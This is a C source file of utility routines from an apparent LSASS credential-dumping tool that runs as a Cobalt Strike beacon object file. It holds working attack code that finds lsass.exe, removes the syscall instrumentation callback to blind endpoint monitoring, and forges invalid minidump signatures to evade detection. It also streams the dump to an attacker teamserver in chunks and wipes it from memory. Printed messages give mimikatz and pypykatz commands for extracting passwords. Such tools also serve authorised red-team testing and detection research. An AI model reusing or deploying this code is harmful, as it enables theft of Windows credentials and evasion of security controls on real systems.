#include "utils.h"
#include "handle.h"
#include "dinvoke.h"
#include "syscalls.h"

#ifndef SSP

BOOL print_shtinkering_crash_location(VOID)
{
    BOOL ret_val = FALSE;
    DWORD bufferSize = 300;
    LPWSTR env_var = NULL;
    BOOL success = FALSE;

    env_var = intAlloc(bufferSize);
    if (!env_var)
    {
        malloc_failed();
        goto cleanup;
    }

    success = get_env_var(L"LocalAppData", env_var, bufferSize);
    if (!success)
        goto cleanup;

    PRINT("Done, run: dir %ls\\CrashDumps\\", env_var);

    ret_val = TRUE;

cleanup:
    if (env_var)
        intFree(env_var);

    return ret_val;
}

BOOL get_env_var(
    IN LPWSTR name,
    OUT LPWSTR value,
    IN DWORD size)
{
    BOOL ret_val = FALSE;
    GetEnvironmentVariableW_t GetEnvironmentVariableW = NULL;

    GetEnvironmentVariableW = (GetEnvironmentVariableW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetEnvironmentVariableW_SW2_HASH,
        0);
    if (!GetEnvironmentVariableW)
    {
        api_not_found("GetEnvironmentVariableW");
        goto cleanup;
    }

    size = GetEnvironmentVariableW(name, value, size);
    if (!size)
    {
        DPRINT_ERR("Retrieving %ls failed", value);
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

// https://github.com/kevoreilly/capemon/blob/940c76cc17c4daefbf11f6cd932a9dece472ace1/hook_sleep.c#L502
DWORD get_tick_count(VOID)
{
    PVOID pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    ULONG32 MajorVersion = *RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);

    if (MajorVersion >= 6)
        return (DWORD)((*(ULONGLONG *)0x7ffe0320 * *(DWORD *)0x7ffe0004) >> 24);
    else
        return (DWORD)(((ULONGLONG)*(DWORD *)0x7ffe0000 * *(DWORD *)0x7ffe0004) >> 24);
}

#endif

BOOL find_process_id_by_name(
    IN LPCSTR process_name,
    OUT PDWORD pPid)
{
    BOOL success = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    HANDLE hProcess = NULL;
    PUNICODE_STRING image = NULL;
    WCHAR wprocess_name[MAX_PATH] = { 0 };
    LPWSTR current_process = NULL;
    *pPid = 0;

    if (!process_name)
        goto end;

    mbstowcs(wprocess_name, process_name, MAX_PATH);

    while (TRUE)
    {
        /*
         * loop over each process
         */
        status = NtGetNextProcess(
            hProcess,
            PROCESS_QUERY_INFORMATION,
            0,
            0,
            &hProcess);
        if (status == STATUS_NO_MORE_ENTRIES)
        {
            PRINT_ERR("The process '%s' was not found", process_name);
            goto end;
        }
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtGetNextProcess", status);
            goto end;
        }

        /*
         * get the full path of the process binary
         */
        image = get_process_image(hProcess);
        if (!image)
            continue;

        if (image->Length == 0)
        {
            intFree(image); image = NULL;
            continue;
        }

        /*
         * get the  process name
         */
        current_process = &wcsrchr(image->Buffer, '\\')[1];

        /*
         * we always return the first match, ignore the rest if any
         */
        if (!_wcsicmp(current_process, wprocess_name))
        {
            intFree(image); image = NULL;
            /*
             * get the PID of the process
             */
            *pPid = get_pid(hProcess);
            break;
        }

        intFree(image); image = NULL;
    }

    if (*pPid)
        success = TRUE;

end:
    if (hProcess)
        NtClose(hProcess);
    if (image)
        intFree(image);

    return success;
}

BOOL is_full_path(
    IN LPCSTR filename)
{
    char c;

    if (filename[0] == filename[1] && filename[1] == '\\')
        return TRUE;

    c = filename[0] | 0x20;
    if (c < 97 || c > 122)
        return FALSE;

    c = filename[1];
    if (c != ':')
        return FALSE;

    c = filename[2];
    if (c != '\\')
        return FALSE;

    return TRUE;
}

VOID get_full_path(
    OUT PUNICODE_STRING full_dump_path,
    IN LPCSTR filename)
{
    wchar_t wcFileName[MAX_PATH];

    // add \??\ at the start
    wcsncpy(full_dump_path->Buffer, L"\\??\\", MAX_PATH);
    // if it is just a relative path, add the current directory
    if (!is_full_path(filename))
        wcsncat(full_dump_path->Buffer, get_cwd(), MAX_PATH);
    // convert the path to wide string
    mbstowcs(wcFileName, filename, MAX_PATH);
    // add the file path
    wcsncat(full_dump_path->Buffer, wcFileName, MAX_PATH);
    // set the length fields
    full_dump_path->Length = (USHORT)wcsnlen(full_dump_path->Buffer, MAX_PATH);
    full_dump_path->Length *= 2;
    full_dump_path->MaximumLength = full_dump_path->Length + 2;
}

LPCWSTR get_cwd(VOID)
{
    PVOID pPeb;
    PPROCESS_PARAMETERS pProcParams;

    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    pProcParams = *RVA(PPROCESS_PARAMETERS*, pPeb, PROCESS_PARAMETERS_OFFSET);
    return pProcParams->CurrentDirectory.DosPath.Buffer;
}

BOOL write_file(
    IN PUNICODE_STRING full_dump_path,
    IN PBYTE fileData,
    IN ULONG32 fileLength)
{
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger = { 0 };
    largeInteger.QuadPart = fileLength;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        full_dump_path,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);
    // create the file
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);
    if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
        status == STATUS_OBJECT_NAME_INVALID)
    {
        PRINT_ERR("The path '%ls' is invalid.", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    // write the dump
    status = NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL);
    NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWriteFile", status);
        PRINT_ERR("Could not write the dump %ls", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    DPRINT("The dump has been written to %ls", &full_dump_path->Buffer[4]);
    return TRUE;
}

BOOL create_file(
    IN PUNICODE_STRING full_dump_path)
{
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK IoStatusBlock;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        full_dump_path,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);

    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);
    if (status == STATUS_OBJECT_PATH_NOT_FOUND ||
        status == STATUS_OBJECT_NAME_INVALID ||
        status == STATUS_OBJECT_PATH_SYNTAX_BAD)
    {
        PRINT_ERR(
            "The path '%ls' is invalid.",
            &full_dump_path->Buffer[4]);
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        DPRINT_ERR("Could not create file at %ls", &full_dump_path->Buffer[4]);
        return FALSE;
    }
    NtClose(hFile); hFile = NULL;
    DPRINT("File created: %ls", &full_dump_path->Buffer[4]);
    return TRUE;
}

BOOL delete_file(
    IN LPCSTR filepath)
{
    OBJECT_ATTRIBUTES objAttr = { 0 };
    wchar_t wcFilePath[MAX_PATH] = { 0 };
    UNICODE_STRING UnicodeFilePath = { 0 };
    UnicodeFilePath.Buffer = wcFilePath;

    if (!filepath)
        return TRUE;

    get_full_path(&UnicodeFilePath, filepath);

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &UnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);

    NTSTATUS status = NtDeleteFile(&objAttr);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtDeleteFile", status);
        DPRINT_ERR("Could not delete file: %s", filepath);
        return FALSE;
    }
    DPRINT("Deleted file: %s", filepath);
    return TRUE;
}

BOOL file_exists(
    IN LPCSTR filepath)
{
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger = { 0 };
    largeInteger.QuadPart = 0;
    wchar_t wcFilePath[MAX_PATH] = { 0 };
    UNICODE_STRING UnicodeFilePath = { 0 };
    UnicodeFilePath.Buffer = wcFilePath;

    if (!filepath)
        return FALSE;

    get_full_path(&UnicodeFilePath, filepath);

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &UnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);
    // call NtCreateFile with FILE_OPEN
    NTSTATUS status = NtCreateFile(
        &hFile,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);
    if (status == STATUS_SHARING_VIOLATION)
    {
        DPRINT_ERR("The file is being used by another process");
        return FALSE;
    }
    if (status == STATUS_OBJECT_NAME_NOT_FOUND)
        return FALSE;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        DPRINT_ERR("Could check if the file %s exists", filepath);
        return FALSE;
    }
    NtClose(hFile); hFile = NULL;
    return TRUE;
}

BOOL create_folder(
    IN LPCSTR folderpath)
{
    HANDLE hFolder = NULL;
    OBJECT_ATTRIBUTES objAttr = { 0 };
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger = { 0 };
    largeInteger.QuadPart = 0;
    wchar_t wcFilePath[MAX_PATH] = { 0 };
    UNICODE_STRING UnicodeFolderPath = { 0 };
    UnicodeFolderPath.Buffer = wcFilePath;
    get_full_path(&UnicodeFolderPath, folderpath);

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        &UnicodeFolderPath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL);
    // call NtCreateFile with FILE_OPEN and FILE_DIRECTORY_FILE
    NTSTATUS status = NtCreateFile(
        &hFolder,
        FILE_GENERIC_READ,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_CREATE,//FILE_OPEN,
        FILE_DIRECTORY_FILE,
        NULL,
        0);
    if (status == STATUS_OBJECT_NAME_COLLISION)
        return TRUE;
    if (status == STATUS_OBJECT_NAME_NOT_FOUND)
        return FALSE;
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateFile", status);
        DPRINT_ERR("Could check if the folder %s exists", folderpath);
        return FALSE;
    }

    NtClose(hFolder); hFolder = NULL;
    return TRUE;
}

BOOL remove_syscall_callback_hook(VOID)
{
    // you can remove this function by providing the compiler flag: -DNOSYSHOOK
#ifndef NOSYSHOOK
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION process_information = { 0 };
#ifdef _WIN64
    process_information.Version = 0;
#else
    process_information.Version = 1;
#endif
    process_information.Reserved = 0;
    process_information.Callback = NULL; // remove the callback function, if any

    NTSTATUS status = NtSetInformationProcess_(
        NtCurrentProcess(),
        ProcessInstrumentationCallback,
        &process_information,
        sizeof(PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION));
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtSetInformationProcess", status);
        DPRINT_ERR("Failed to remove the syscall callback hook");
        return FALSE;
    }
    else
    {
        DPRINT("The syscall callback hook was set to NULL");
    }
#endif
    return TRUE;
}

VOID free_linked_list(
    IN PVOID head)
{
    if (!head)
        return;

    Plinked_list node = (Plinked_list)head;
    ULONG32 number_of_nodes = 0;
    while (node)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        node = (Plinked_list)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

PVOID allocate_memory(
    OUT PSIZE_T region_size)
{
    PVOID base_address = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &base_address,
        0,
        region_size,
        MEM_COMMIT,
        PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {

        DPRINT_ERR(
            "Could not allocate enough memory to write the dump");
        return NULL;
    }
    DPRINT(
        "Allocated 0x%llx bytes at 0x%p to write the dump",
        (ULONG64)*region_size,
        base_address);
    return base_address;
}

// for example, encrypt the dump with an XOR key
VOID encrypt_dump(
    IN PVOID base_address,
    IN SIZE_T region_size)
{
    UNUSED(base_address);
    UNUSED(region_size);
    //BYTE key = 0x2e;
    //PBYTE addr = NULL;

    //if (!base_address)
    //    return;

    //for (SIZE_T i = 0; i < region_size; i++)
    //{
    //    addr = RVA(PBYTE, base_address, i);
    //    *addr ^= key;
    //}
}

VOID erase_dump_from_memory(
    IN PVOID base_address,
    IN SIZE_T region_size)
{
    if (!base_address || !region_size)
        return;

    // delete all trace of the dump from memory
    memset(base_address, 0, region_size);
    // free the memory area where the dump was
    region_size = 0;
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &base_address,
        &region_size,
        MEM_RELEASE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtFreeVirtualMemory", status);
        DPRINT_ERR("Could not erased the dump from memory");
    }
    else
    {
        DPRINT("Erased the dump from memory");
    }
}

VOID generate_invalid_sig(
    OUT PULONG32 Signature,
    OUT PUSHORT Version,
    OUT PUSHORT ImplementationVersion)
{
    time_t t;
    srand((unsigned) time(&t));

    *Signature             = MINIDUMP_SIGNATURE;
    *Version               = MINIDUMP_VERSION;
    *ImplementationVersion = MINIDUMP_IMPL_VERSION;

    while (*Signature             == MINIDUMP_SIGNATURE ||
           *Version               == MINIDUMP_VERSION ||
           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
    {
        *Signature  = 0;
        *Signature |= (rand() & 0x7FFF) << 0x11;
        *Signature |= (rand() & 0x7FFF) << 0x02;
        *Signature |= (rand() & 0x0003) << 0x00;

        *Version  = 0;
        *Version |= (rand() & 0xFF) << 0x08;
        *Version |= (rand() & 0xFF) << 0x00;

        *ImplementationVersion  = 0;
        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
    }
}

#if defined(NANO) && defined(BOF)

BOOL download_file(
    IN LPCSTR fileName,
    IN char fileData[],
    IN ULONG32 fileLength)
{
    int fileNameLength = strnlen(fileName, 256);

    // intializes the random number generator
    time_t t;
    srand((unsigned) time(&t));

    // generate a 4 byte random id, rand max value is 0x7fff
    ULONG32 fileId = 0;
    fileId |= (rand() & 0x7FFF) << 0x11;
    fileId |= (rand() & 0x7FFF) << 0x02;
    fileId |= (rand() & 0x0003) << 0x00;

    // 8 bytes for fileId and fileLength
    int messageLength = 8 + fileNameLength;
    char* packedData = intAlloc(messageLength);
    if (!packedData)
    {
        malloc_failed();
        DPRINT_ERR("Could download the dump");
        return FALSE;
    }

    // pack on fileId as 4-byte int first
    packedData[0] = (fileId >> 0x18) & 0xFF;
    packedData[1] = (fileId >> 0x10) & 0xFF;
    packedData[2] = (fileId >> 0x08) & 0xFF;
    packedData[3] = (fileId >> 0x00) & 0xFF;

    // pack on fileLength as 4-byte int second
    packedData[4] = (fileLength >> 0x18) & 0xFF;
    packedData[5] = (fileLength >> 0x10) & 0xFF;
    packedData[6] = (fileLength >> 0x08) & 0xFF;
    packedData[7] = (fileLength >> 0x00) & 0xFF;

    // pack on the file name last
    for (int i = 0; i < fileNameLength; i++)
    {
        packedData[8 + i] = fileName[i];
    }

    // tell the teamserver that we want to download a file
    BeaconOutput(
        CALLBACK_FILE,
        packedData,
        messageLength);
    intFree(packedData); packedData = NULL;

    // we use the same memory region for all chucks
    int chunkLength = 4 + CHUNK_SIZE;
    char* packedChunk = intAlloc(chunkLength);
    if (!packedChunk)
    {
        malloc_failed();
        DPRINT_ERR("Could download the dump");
        return FALSE;
    }
    // the fileId is the same for all chunks
    packedChunk[0] = (fileId >> 0x18) & 0xFF;
    packedChunk[1] = (fileId >> 0x10) & 0xFF;
    packedChunk[2] = (fileId >> 0x08) & 0xFF;
    packedChunk[3] = (fileId >> 0x00) & 0xFF;

    ULONG32 exfiltrated = 0;
    while (exfiltrated < fileLength)
    {
        // send the file content by chunks
        chunkLength = fileLength - exfiltrated > CHUNK_SIZE ? CHUNK_SIZE : fileLength - exfiltrated;
        ULONG32 chunkIndex = 4;
        for (ULONG32 i = exfiltrated; i < exfiltrated + chunkLength; i++)
        {
            packedChunk[chunkIndex++] = fileData[i];
        }
        // send a chunk
        BeaconOutput(
            CALLBACK_FILE_WRITE,
            packedChunk,
            4 + chunkLength);
        exfiltrated += chunkLength;
    }
    intFree(packedChunk); packedChunk = NULL;

    // tell the teamserver that we are done writing to this fileId
    char packedClose[4];
    packedClose[0] = (fileId >> 0x18) & 0xFF;
    packedClose[1] = (fileId >> 0x10) & 0xFF;
    packedClose[2] = (fileId >> 0x08) & 0xFF;
    packedClose[3] = (fileId >> 0x00) & 0xFF;
    BeaconOutput(
        CALLBACK_FILE_CLOSE,
        packedClose,
        4);
    DPRINT("The dump was downloaded filessly");
    return TRUE;
}

#endif

#if (defined(NANO) || defined(PPL)) && !defined(SSP)

BOOL wait_for_process(
    IN HANDLE hProcess)
{
    NTSTATUS status = NtWaitForSingleObject(
        hProcess,
        TRUE,
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtWaitForSingleObject", status);
        DPRINT_ERR("Could not wait for process");
        return FALSE;
    }
    return TRUE;
}

VOID print_success(
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL write_dump_to_disk)
{
    if (!use_valid_sig)
    {
        PRINT(
            "The minidump has an invalid signature, restore it running:\nscripts/restore_signature %s",
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
    }
    if (write_dump_to_disk)
    {
#ifdef BOF
        PRINT(
            "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
            dump_path,
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path,
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
#else
        PRINT(
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path,
            strrchr(dump_path, '\\')? &strrchr(dump_path, '\\')[1] : dump_path);
#endif
    }
    else
    {
        PRINT(
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\nmimikatz.exe \"sekurlsa::minidump %s\" \"sekurlsa::logonPasswords full\" exit",
            dump_path,
            dump_path);
    }
}

#endif

PVOID get_process_image(
    IN HANDLE hProcess)
{
    NTSTATUS status;
    ULONG BufferLength = 0x200;
    PVOID buffer;
    do
    {
        buffer = intAlloc(BufferLength);
        if (!buffer)
        {
            malloc_failed();
            DPRINT_ERR("Could not get the image of process");
            return NULL;
        }
        status = NtQueryInformationProcess(
            hProcess,
            ProcessImageFileName,
            buffer,
            BufferLength,
            &BufferLength);
        if (NT_SUCCESS(status))
            return buffer;

        intFree(buffer); buffer = NULL;
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    syscall_failed("NtQueryInformationProcess", status);
    DPRINT_ERR("Could not get the image of process");
    return NULL;
}

DWORD get_pid(
    IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION basic_info;
    basic_info.UniqueProcessId = 0;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationProcess", status);
        return 0;
    }

    return (DWORD)basic_info.UniqueProcessId;
}

DWORD get_tid(
    IN HANDLE hThread)
{
    THREAD_BASIC_INFORMATION basic_info = { 0 };
    THREADINFOCLASS ProcessInformationClass = 0;

    NTSTATUS status = _NtQueryInformationThread(
        hThread,
        ProcessInformationClass,
        &basic_info,
        sizeof(THREAD_BASIC_INFORMATION),
        NULL);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationThread", status);
        return 0;
    }

    return (DWORD)(ULONG_PTR)basic_info.ClientId.UniqueThread;
}

#if defined(NANO) && !defined(SSP)

BOOL is_lsass(
    IN HANDLE hProcess)
{
    PUNICODE_STRING image = get_process_image(hProcess);
    if (!image)
        return FALSE;

    if (image->Length == 0)
    {
        intFree(image); image = NULL;
        return FALSE;
    }

    if (wcsstr(image->Buffer, L"\\lsass.exe"))
    {
        intFree(image); image = NULL;
        return TRUE;
    }

    intFree(image); image = NULL;
    return FALSE;
}

/*
 * kill a process by PID
 * used to kill processes created by MalSecLogon
 */
BOOL kill_process(
    IN DWORD pid,
    IN HANDLE hProcess)
{
    if (!pid && !hProcess)
        return TRUE;

    if (pid)
    {
        // open a handle with PROCESS_TERMINATE
        hProcess = get_process_handle(
            pid,
            PROCESS_TERMINATE,
            FALSE,
            0);
        if (!hProcess)
        {
            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
            return FALSE;
        }
    }

    NTSTATUS status = NtTerminateProcess(
        hProcess,
        ERROR_SUCCESS);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtTerminateProcess", status);
        if (pid)
        {
            DPRINT_ERR("Failed to kill process with PID: %ld", pid);
        }
        else
        {
            DPRINT_ERR("Failed to kill process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
        }
        return FALSE;
    }
    if (pid)
    {
        DPRINT("Killed process with PID: %ld", pid);
    }
    else
    {
        DPRINT("Killed process with handle: 0x%lx", (DWORD)(ULONG_PTR)hProcess);
    }

    return TRUE;
}

DWORD get_lsass_pid(VOID)
{
    DWORD lsass_pid;
    HANDLE hProcess = find_lsass(PROCESS_QUERY_LIMITED_INFORMATION, 0);
    if (!hProcess)
        return 0;
    lsass_pid = get_pid(hProcess);
    NtClose(hProcess); hProcess = NULL;
    if (!lsass_pid)
    {
        DPRINT_ERR("Could not get the PID of " LSASS);
    }
    else
    {
        DPRINT("Found the PID of " LSASS ": %ld", lsass_pid);
    }
    return lsass_pid;
}

#endif
